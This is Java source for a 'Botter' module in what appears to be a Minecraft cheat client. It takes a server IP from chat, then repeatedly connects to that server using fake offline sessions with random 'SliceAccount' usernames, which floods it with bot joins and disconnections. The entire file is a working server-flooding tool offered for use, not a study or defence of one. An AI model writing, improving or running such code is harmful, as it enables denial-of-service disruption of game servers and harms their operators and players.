package slice.module.modules.misc;

import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.util.Session;
import slice.event.data.EventInfo;
import slice.event.events.EventChat;
import slice.event.events.EventUpdate;
import slice.module.Module;
import slice.module.data.Category;
import slice.module.data.ModuleInfo;
import slice.setting.settings.NumberValue;
import slice.util.LoggerUtil;

@SuppressWarnings("all") @ModuleInfo(name = "Botter", description = "Spams a server with disconnections", category = Category.MISC)
public class Botter extends Module {

    private String ip, prefix;
    private boolean sentPrefixMessage;

    NumberValue delay = new NumberValue("Delay", 1000L, 200L, 5000L, NumberValue.Type.LONG);

    public void onEnable() {
        ip = null;
        prefix = "SliceAccount";
        sentPrefixMessage = true;
        LoggerUtil.addMessage("Please enter the IP of the server to bot");
    }

    @EventInfo
    public void onChat(EventChat e) {
        String message = e.getMessage();

        if(ip == null || prefix == null) {
            e.setCancelled(true);
        }

        if(ip == null) {
            ip = message;
            return;
        }
    }

    @EventInfo
    public void onUpdate(EventUpdate e) {
        if(ip == null || prefix == null) return;

        if(timer.hasReached(delay.getValue().longValue())) {
            new GuiConnecting(new Session(prefix + (int) Math.floor(Math.random() * 1000), "0", "0", "mojang"), ip.split(":")[0], Integer.parseInt(ip.split(":")[1]));
            timer.reset();
        }
    }
}
